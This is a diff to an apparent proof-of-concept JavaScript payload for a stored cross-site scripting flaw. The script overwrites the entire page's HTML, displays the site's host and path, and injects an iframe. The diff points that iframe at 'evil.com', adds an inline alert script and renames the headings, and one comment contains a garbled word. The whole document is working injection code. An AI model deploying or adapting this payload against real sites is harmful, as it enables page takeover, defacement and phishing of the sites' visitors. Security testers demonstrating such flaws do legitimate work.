@@ -2,7 +2,7 @@
   // 1️⃣ Destrxxeoy entire document (not just body)
   document.documentElement.innerHTML = `
     <head>
-      <title>Stored XSS PoC</title>
+      <title>XSS PoC</title>
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <style>
         html, body {
@@ -44,7 +44,7 @@
   const p1 = document.createElement('div');
   p1.style.cssText = panel;
   p1.innerHTML = `
-    <h2>✅ Stored XSS — Full DOM Takeover</h2>
+    <h2>✅ XSS — Full DOM Takeover</h2>
     <p>This content replaced the <b>entire document</b>.</p>
     <p><b>Domain:</b> ${location.host}</p>
     <p><b>Path:</b> ${location.pathname}</p>
@@ -57,7 +57,7 @@
   p2.innerHTML = `
     <h2>🧩 Arbitrary Iframe Injection</h2>
     <iframe
-      src="https://example.com"
+      src="https://evil.com"
       style="width:100%;height:80%;border:1px solid #555;background:#fff">
     </iframe>
   `;
@@ -86,6 +86,7 @@
 
     <p style="font-size:12px;color:#aaa;margin-top:10px">
       Demonstrates full page replacement via Stored XSS.
+      <script>alert("XSS EXECUTED")</script>
     </p>
   `;
 
@@ -94,5 +95,4 @@
   wrapper.appendChild(p3);
   document.body.appendChild(wrapper);
 
-  alert('Stored XSS: Full DOM takeover successful');
 })();
